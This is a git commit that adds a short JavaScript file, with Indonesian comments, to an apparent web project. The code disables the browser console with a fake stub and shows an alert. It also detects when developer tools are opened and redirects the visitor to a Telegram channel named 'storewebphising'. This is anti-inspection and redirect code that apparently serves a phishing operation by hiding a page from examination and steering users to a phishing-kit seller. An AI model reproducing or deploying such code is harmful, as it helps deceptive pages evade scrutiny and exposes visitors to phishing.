9d5ecd2340366888545228e6655dee32e85fba55
manyu <142495420+rindraabi@users.noreply.github.com>
2025-03-21 11:54:31 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,34 @@
 
+(function() {
+    // Menampilkan ASCII art saat konsol dibuka
+    var asciiArt = `
+███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
+████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
+██╔████╔██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
+██║╚██╔╝██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
+██║░╚═╝░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
+╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
+    `;
+
+    // Menonaktifkan akses ke console
+    Object.defineProperty(window, 'console', {
+        get: function() {
+            alert('Console diblokir. Anda tidak dapat mengakses console!');
+            return {
+                log: function() {},
+                warn: function() {},
+                error: function() {},
+                info: function() {}
+            };
+        }
+    });
+
+    // Menambahkan pesan saat Developer Tools dibuka
+    var devtools = /./;
+    devtools.toString = function() {
+        alert('manyu store');
+        console.log(asciiArt);
+        window.location.href = 'https://t.me/storewebphising';
+    };
+    console.log(devtools);
+})();
